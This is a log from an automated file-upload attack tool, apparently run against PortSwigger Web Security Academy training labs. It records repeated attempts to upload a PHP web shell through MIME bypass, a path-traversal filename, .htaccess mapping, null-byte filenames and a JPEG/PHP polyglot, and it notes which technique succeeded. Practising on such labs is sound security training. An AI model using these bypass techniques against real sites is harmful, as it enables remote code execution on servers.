[2026-09-21 12:00:26] [INFO] Starting project.
[2026-09-21 12:00:26] [OK] Target URL configured.
[2026-09-21 12:00:26] [OK] Upload URL configured.
[2026-09-21 12:00:26] [OK] .htaccess source exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\htaccess.txt
[2026-09-21 12:00:26] [OK] Null-byte file exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\nullbyte_names.txt
[2026-09-21 12:00:26] [OK] Pre-built polyglot exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\polyglot_jpg.php
[2026-09-21 12:00:26] [INFO] Using manual session cookie: session=[REDACTED]
[2026-09-21 12:00:27] [INFO] Authentication check: HTTP 200 https://0a2b0066048690ed80a25dc600ba00ce.web-security-academy.net/my-account
[2026-09-21 12:00:27] [INFO] CSRF token extracted.
[2026-09-21 12:00:39] [INFO] Challenge Mode started.
[2026-09-21 12:00:39] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:00:39] [INFO] Upload response: HTTP 200
[2026-09-21 12:00:40] [WARN] direct: HTTP response received, but runtime success marker was not detected.
[2026-09-21 12:00:40] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:00:41] [INFO] Upload response: HTTP 200
[2026-09-21 12:00:41] [WARN] mime: HTTP response received, but runtime success marker was not detected.
[2026-09-21 12:00:41] [INFO] Technique 3: path traversal filename
[2026-09-21 12:00:41] [INFO] Traversal wire filename: ..%2fchallenge_shell.php
[2026-09-21 12:00:41] [INFO] Traversal verify path: /files/challenge_shell.php
[2026-09-21 12:00:42] [INFO] Traversal upload: HTTP 200
[2026-09-21 12:00:43] [OK] SUCCESS via traversal
[2026-09-21 12:02:55] [INFO] Starting project.
[2026-09-21 12:02:55] [OK] Target URL configured.
[2026-09-21 12:02:55] [OK] Upload URL configured.
[2026-09-21 12:02:55] [OK] .htaccess source exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\htaccess.txt
[2026-09-21 12:02:55] [OK] Null-byte file exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\nullbyte_names.txt
[2026-09-21 12:02:55] [OK] Pre-built polyglot exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\polyglot_jpg.php
[2026-09-21 12:02:55] [INFO] Using manual session cookie: session=[REDACTED]
[2026-09-21 12:02:56] [INFO] Authentication check: HTTP 200 https://0a2b0066048690ed80a25dc600ba00ce.web-security-academy.net/my-account
[2026-09-21 12:02:56] [INFO] CSRF token extracted.
[2026-09-21 12:02:57] [INFO] Challenge Mode started.
[2026-09-21 12:02:57] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:02:58] [INFO] Upload response: HTTP 200
[2026-09-21 12:02:59] [WARN] direct: HTTP response received, but runtime success marker was not detected.
[2026-09-21 12:02:59] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:02:59] [INFO] Upload response: HTTP 200
[2026-09-21 12:03:00] [WARN] mime: HTTP response received, but runtime success marker was not detected.
[2026-09-21 12:03:00] [INFO] Technique 3: path traversal filename
[2026-09-21 12:03:00] [INFO] Traversal wire filename: ..%2fchallenge_shell.php
[2026-09-21 12:03:00] [INFO] Traversal verify path: /files/challenge_shell.php
[2026-09-21 12:03:00] [INFO] Traversal upload: HTTP 200
[2026-09-21 12:03:01] [OK] SUCCESS via traversal
[2026-09-21 12:03:11] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:03:12] [INFO] Upload response: HTTP 200
[2026-09-21 12:03:13] [WARN] direct: HTTP response received, but runtime success marker was not detected.
[2026-09-21 12:03:13] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:03:13] [INFO] Upload response: HTTP 200
[2026-09-21 12:03:14] [WARN] mime: HTTP response received, but runtime success marker was not detected.
[2026-09-21 12:03:14] [INFO] Technique 3: path traversal filename
[2026-09-21 12:03:14] [INFO] Traversal wire filename: ..%2fchallenge_shell.php
[2026-09-21 12:03:14] [INFO] Traversal verify path: /files/challenge_shell.php
[2026-09-21 12:03:14] [INFO] Traversal upload: HTTP 200
[2026-09-21 12:03:15] [OK] SUCCESS via traversal
[2026-09-21 12:03:25] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:03:26] [INFO] Upload response: HTTP 200
[2026-09-21 12:03:26] [WARN] direct: HTTP response received, but runtime success marker was not detected.
[2026-09-21 12:03:39] [INFO] Starting project.
[2026-09-21 12:03:39] [OK] Target URL configured.
[2026-09-21 12:03:39] [OK] Upload URL configured.
[2026-09-21 12:03:39] [OK] .htaccess source exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\htaccess.txt
[2026-09-21 12:03:39] [OK] Null-byte file exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\nullbyte_names.txt
[2026-09-21 12:03:39] [OK] Pre-built polyglot exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\polyglot_jpg.php
[2026-09-21 12:03:39] [INFO] Using manual session cookie: session=[REDACTED]
[2026-09-21 12:03:40] [INFO] Authentication check: HTTP 200 https://0aac001e035ea839801b9e50005a009a.web-security-academy.net/my-account
[2026-09-21 12:03:40] [INFO] CSRF token extracted.
[2026-09-21 12:03:43] [INFO] Challenge Mode started.
[2026-09-21 12:03:43] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:03:43] [INFO] Upload response: HTTP 200
[2026-09-21 12:03:44] [OK] SUCCESS via direct
[2026-09-21 12:05:50] [INFO] Starting project.
[2026-09-21 12:05:50] [OK] Target URL configured.
[2026-09-21 12:05:50] [OK] Upload URL configured.
[2026-09-21 12:05:50] [OK] .htaccess source exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\htaccess.txt
[2026-09-21 12:05:50] [OK] Null-byte file exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\nullbyte_names.txt
[2026-09-21 12:05:50] [OK] Pre-built polyglot exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\polyglot_jpg.php
[2026-09-21 12:05:50] [INFO] Using manual session cookie: session=[REDACTED]
[2026-09-21 12:05:51] [INFO] Authentication check: HTTP 200 https://0a1b00e3048b74a3804a358e002000d6.web-security-academy.net/my-account
[2026-09-21 12:05:51] [INFO] No CSRF token found.
[2026-09-21 12:05:53] [INFO] Challenge Mode started.
[2026-09-21 12:05:53] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:05:53] [INFO] Upload response: HTTP 404
[2026-09-21 12:05:53] [WARN] direct: Upload rejected: HTTP 404
[2026-09-21 12:05:53] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:05:54] [INFO] Upload response: HTTP 404
[2026-09-21 12:05:54] [WARN] mime: Upload rejected: HTTP 404
[2026-09-21 12:05:54] [INFO] Technique 3: path traversal filename
[2026-09-21 12:05:54] [INFO] Traversal wire filename: ..%2fchallenge_shell.php
[2026-09-21 12:05:54] [INFO] Traversal verify path: /files/challenge_shell.php
[2026-09-21 12:05:54] [INFO] Traversal upload: HTTP 404
[2026-09-21 12:05:54] [WARN] traversal: Upload rejected: HTTP 404
[2026-09-21 12:05:54] [INFO] Technique 4: .htaccess extension mapping
[2026-09-21 12:05:54] [INFO] Detected extension: .ssdd
[2026-09-21 12:05:55] [INFO] .htaccess upload: HTTP 404
[2026-09-21 12:05:55] [WARN] htaccess: .htaccess upload rejected: HTTP 404
[2026-09-21 12:05:55] [INFO] Technique 5: null-byte candidates
[2026-09-21 12:05:55] [INFO] Trying: challenge_shell.php%00.jpg
[2026-09-21 12:05:55] [INFO] Upload response: HTTP 404
[2026-09-21 12:05:55] [INFO] Trying: shell.php%00.jpg
[2026-09-21 12:05:56] [INFO] Upload response: HTTP 404
[2026-09-21 12:05:56] [INFO] Trying: 11.php%00.jpg
[2026-09-21 12:05:57] [INFO] Upload response: HTTP 404
[2026-09-21 12:05:57] [WARN] nullbyte: All null-byte candidates exhausted.
[2026-09-21 12:05:57] [INFO] Technique 6: pre-built JPEG/PHP polyglot
[2026-09-21 12:05:59] [INFO] Polyglot upload: HTTP 404
[2026-09-21 12:05:59] [WARN] polyglot: Upload rejected: HTTP 404
[2026-09-21 12:08:25] [INFO] Starting project.
[2026-09-21 12:08:25] [OK] Target URL configured.
[2026-09-21 12:08:25] [OK] Upload URL configured.
[2026-09-21 12:08:25] [OK] .htaccess source exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\htaccess.txt
[2026-09-21 12:08:25] [OK] Null-byte file exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\nullbyte_names.txt
[2026-09-21 12:08:25] [OK] Pre-built polyglot exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\polyglot_jpg.php
[2026-09-21 12:08:25] [INFO] Using manual session cookie: session=[REDACTED]
[2026-09-21 12:08:26] [INFO] Authentication check: HTTP 200 https://0a3400e603354ced84ba7c48002400e4.web-security-academy.net/my-account
[2026-09-21 12:08:26] [INFO] CSRF token extracted.
[2026-09-21 12:08:27] [INFO] Challenge Mode started.
[2026-09-21 12:08:27] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:08:28] [INFO] Upload response: HTTP 403
[2026-09-21 12:08:28] [WARN] direct: Upload rejected: HTTP 403
[2026-09-21 12:08:28] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:08:28] [INFO] Upload response: HTTP 403
[2026-09-21 12:08:28] [WARN] mime: Upload rejected: HTTP 403
[2026-09-21 12:08:28] [INFO] Technique 3: path traversal filename
[2026-09-21 12:08:28] [INFO] Traversal wire filename: ..%2fchallenge_shell.php
[2026-09-21 12:08:28] [INFO] Traversal verify path: /files/challenge_shell.php
[2026-09-21 12:08:29] [INFO] Traversal upload: HTTP 403
[2026-09-21 12:08:29] [WARN] traversal: Upload rejected: HTTP 403
[2026-09-21 12:08:29] [INFO] Technique 4: .htaccess extension mapping
[2026-09-21 12:08:29] [INFO] Detected extension: .ssdd
[2026-09-21 12:08:30] [INFO] .htaccess upload: HTTP 200
[2026-09-21 12:08:30] [INFO] Mapped shell upload: HTTP 200
[2026-09-21 12:08:31] [OK] SUCCESS via htaccess
[2026-09-21 12:11:50] [INFO] Challenge Mode started.
[2026-09-21 12:11:50] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:11:51] [INFO] Upload response: HTTP 403
[2026-09-21 12:11:51] [WARN] direct: Upload rejected: HTTP 403
[2026-09-21 12:11:51] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:11:52] [INFO] Upload response: HTTP 403
[2026-09-21 12:11:52] [WARN] mime: Upload rejected: HTTP 403
[2026-09-21 12:11:52] [INFO] Technique 3: path traversal filename
[2026-09-21 12:11:52] [INFO] Traversal wire filename: ..%2fchallenge_shell.php
[2026-09-21 12:11:52] [INFO] Traversal verify path: /files/challenge_shell.php
[2026-09-21 12:11:53] [INFO] Traversal upload: HTTP 403
[2026-09-21 12:11:53] [WARN] traversal: Upload rejected: HTTP 403
[2026-09-21 12:11:53] [INFO] Technique 4: .htaccess extension mapping
[2026-09-21 12:11:53] [INFO] Detected extension: .ssdd
[2026-09-21 12:11:53] [INFO] .htaccess upload: HTTP 200
[2026-09-21 12:11:54] [INFO] Mapped shell upload: HTTP 200
[2026-09-21 12:11:55] [OK] SUCCESS via htaccess
[2026-09-21 12:12:15] [INFO] Starting project.
[2026-09-21 12:12:15] [OK] Target URL configured.
[2026-09-21 12:12:15] [OK] Upload URL configured.
[2026-09-21 12:12:15] [OK] .htaccess source exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\htaccess.txt
[2026-09-21 12:12:15] [OK] Null-byte file exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\nullbyte_names.txt
[2026-09-21 12:12:15] [OK] Pre-built polyglot exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\polyglot_jpg.php
[2026-09-21 12:12:15] [INFO] Using manual session cookie: session=[REDACTED]
[2026-09-21 12:12:16] [INFO] Authentication check: HTTP 200 https://0ae000fc030c042a80d3eedd004a00af.web-security-academy.net/my-account
[2026-09-21 12:12:16] [INFO] CSRF token extracted.
[2026-09-21 12:12:19] [INFO] Challenge Mode started.
[2026-09-21 12:12:19] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:12:19] [INFO] Upload response: HTTP 403
[2026-09-21 12:12:19] [WARN] direct: Upload rejected: HTTP 403
[2026-09-21 12:12:19] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:12:20] [INFO] Upload response: HTTP 200
[2026-09-21 12:12:21] [OK] SUCCESS via mime
[2026-09-21 12:15:01] [INFO] Starting project.
[2026-09-21 12:15:01] [OK] Target URL configured.
[2026-09-21 12:15:01] [OK] Upload URL configured.
[2026-09-21 12:15:01] [OK] .htaccess source exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\htaccess.txt
[2026-09-21 12:15:01] [OK] Null-byte file exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\nullbyte_names.txt
[2026-09-21 12:15:01] [OK] Pre-built polyglot exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\polyglot_jpg.php
[2026-09-21 12:15:01] [INFO] Using manual session cookie: session=[REDACTED]
[2026-09-21 12:15:02] [INFO] Authentication check: HTTP 200 https://0aef0042043790ba809c71ef003d0061.web-security-academy.net/my-account
[2026-09-21 12:15:02] [INFO] CSRF token extracted.
[2026-09-21 12:15:03] [INFO] Challenge Mode started.
[2026-09-21 12:15:03] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:15:04] [INFO] Upload response: HTTP 403
[2026-09-21 12:15:04] [WARN] direct: Upload rejected: HTTP 403
[2026-09-21 12:15:04] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:15:04] [INFO] Upload response: HTTP 403
[2026-09-21 12:15:04] [WARN] mime: Upload rejected: HTTP 403
[2026-09-21 12:15:04] [INFO] Technique 3: path traversal filename
[2026-09-21 12:15:04] [INFO] Traversal wire filename: ..%2fchallenge_shell.php
[2026-09-21 12:15:04] [INFO] Traversal verify path: /files/challenge_shell.php
[2026-09-21 12:15:05] [INFO] Traversal upload: HTTP 403
[2026-09-21 12:15:05] [WARN] traversal: Upload rejected: HTTP 403
[2026-09-21 12:15:05] [INFO] Technique 4: .htaccess extension mapping
[2026-09-21 12:15:05] [INFO] Detected extension: .ssdd
[2026-09-21 12:15:06] [INFO] .htaccess upload: HTTP 403
[2026-09-21 12:15:06] [WARN] htaccess: .htaccess upload rejected: HTTP 403
[2026-09-21 12:15:06] [INFO] Technique 5: null-byte candidates
[2026-09-21 12:15:06] [INFO] Trying: challenge_shell.php%00.jpg
[2026-09-21 12:15:06] [INFO] Upload response: HTTP 200
[2026-09-21 12:15:07] [OK] SUCCESS via nullbyte
[2026-09-21 12:16:30] [INFO] Starting project.
[2026-09-21 12:16:30] [OK] Target URL configured.
[2026-09-21 12:16:30] [OK] Upload URL configured.
[2026-09-21 12:16:30] [OK] .htaccess source exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\htaccess.txt
[2026-09-21 12:16:30] [OK] Null-byte file exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\nullbyte_names.txt
[2026-09-21 12:16:30] [OK] Pre-built polyglot exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\polyglot_jpg.php
[2026-09-21 12:16:30] [INFO] Using manual session cookie: session=[REDACTED]
[2026-09-21 12:16:31] [INFO] Authentication check: HTTP 200 https://0aeb00bd042e6b6983f96a9800c10046.web-security-academy.net/my-account
[2026-09-21 12:16:31] [INFO] CSRF token extracted.
[2026-09-21 12:16:32] [INFO] Challenge Mode started.
[2026-09-21 12:16:32] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:16:33] [INFO] Upload response: HTTP 403
[2026-09-21 12:16:33] [WARN] direct: Upload rejected: HTTP 403
[2026-09-21 12:16:33] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:16:34] [INFO] Upload response: HTTP 403
[2026-09-21 12:16:34] [WARN] mime: Upload rejected: HTTP 403
[2026-09-21 12:16:34] [INFO] Technique 3: path traversal filename
[2026-09-21 12:16:34] [INFO] Traversal wire filename: ..%2fchallenge_shell.php
[2026-09-21 12:16:34] [INFO] Traversal verify path: /files/challenge_shell.php
[2026-09-21 12:16:35] [INFO] Traversal upload: HTTP 403
[2026-09-21 12:16:35] [WARN] traversal: Upload rejected: HTTP 403
[2026-09-21 12:16:35] [INFO] Technique 4: .htaccess extension mapping
[2026-09-21 12:16:35] [INFO] Detected extension: .ssdd
[2026-09-21 12:16:35] [INFO] .htaccess upload: HTTP 403
[2026-09-21 12:16:35] [WARN] htaccess: .htaccess upload rejected: HTTP 403
[2026-09-21 12:16:35] [INFO] Technique 5: null-byte candidates
[2026-09-21 12:16:35] [INFO] Trying: challenge_shell.php%00.jpg
[2026-09-21 12:16:36] [INFO] Upload response: HTTP 403
[2026-09-21 12:16:36] [INFO] Trying: shell.php%00.jpg
[2026-09-21 12:16:37] [INFO] Upload response: HTTP 403
[2026-09-21 12:16:37] [INFO] Trying: 11.php%00.jpg
[2026-09-21 12:16:37] [INFO] Upload response: HTTP 403
[2026-09-21 12:16:37] [WARN] nullbyte: All null-byte candidates exhausted.
[2026-09-21 12:16:37] [INFO] Technique 6: pre-built JPEG/PHP polyglot
[2026-09-21 12:16:41] [INFO] Polyglot upload: HTTP 200
[2026-09-21 12:16:43] [WARN] polyglot: HTTP response received, but runtime success marker was not detected.
[2026-09-21 12:17:43] [INFO] Starting project.
[2026-09-21 12:17:43] [OK] Target URL configured.
[2026-09-21 12:17:43] [OK] Upload URL configured.
[2026-09-21 12:17:43] [OK] .htaccess source exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\htaccess.txt
[2026-09-21 12:17:43] [OK] Null-byte file exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\nullbyte_names.txt
[2026-09-21 12:17:43] [OK] Pre-built polyglot exists: C:\Users\ZE\Downloads\Compressed\por_uploads_file\portswigger_adaptive_upload_final_v3\portswigger_adaptive_upload_final\data\polyglot_jpg.php
[2026-09-21 12:17:43] [INFO] Using manual session cookie: session=[REDACTED]
[2026-09-21 12:17:44] [INFO] Authentication check: HTTP 200 https://0aeb00bd042e6b6983f96a9800c10046.web-security-academy.net/my-account
[2026-09-21 12:17:44] [INFO] CSRF token extracted.
[2026-09-21 12:17:44] [INFO] Challenge Mode started.
[2026-09-21 12:17:44] [INFO] Technique 1: unrestricted PHP upload
[2026-09-21 12:17:45] [INFO] Upload response: HTTP 403
[2026-09-21 12:17:45] [WARN] direct: Upload rejected: HTTP 403
[2026-09-21 12:17:45] [INFO] Technique 2: Content-Type bypass
[2026-09-21 12:17:46] [INFO] Upload response: HTTP 403
[2026-09-21 12:17:46] [WARN] mime: Upload rejected: HTTP 403
[2026-09-21 12:17:46] [INFO] Technique 3: path traversal filename
[2026-09-21 12:17:46] [INFO] Traversal wire filename: ..%2fchallenge_shell.php
[2026-09-21 12:17:46] [INFO] Traversal verify path: /files/challenge_shell.php
[2026-09-21 12:17:46] [INFO] Traversal upload: HTTP 403
[2026-09-21 12:17:46] [WARN] traversal: Upload rejected: HTTP 403
[2026-09-21 12:17:46] [INFO] Technique 4: .htaccess extension mapping
[2026-09-21 12:17:46] [INFO] Detected extension: .ssdd
[2026-09-21 12:17:47] [INFO] .htaccess upload: HTTP 403
[2026-09-21 12:17:47] [WARN] htaccess: .htaccess upload rejected: HTTP 403
[2026-09-21 12:17:47] [INFO] Technique 5: null-byte candidates
[2026-09-21 12:17:47] [INFO] Trying: challenge_shell.php%00.jpg
[2026-09-21 12:17:48] [INFO] Upload response: HTTP 403
[2026-09-21 12:17:48] [INFO] Trying: shell.php%00.jpg
[2026-09-21 12:17:49] [INFO] Upload response: HTTP 403
[2026-09-21 12:17:49] [INFO] Trying: 11.php%00.jpg
[2026-09-21 12:17:50] [INFO] Upload response: HTTP 403
[2026-09-21 12:17:50] [WARN] nullbyte: All null-byte candidates exhausted.
[2026-09-21 12:17:50] [INFO] Technique 6: pre-built JPEG/PHP polyglot
[2026-09-21 12:17:53] [INFO] Polyglot upload: HTTP 200
[2026-09-21 12:17:55] [OK] SUCCESS via polyglot
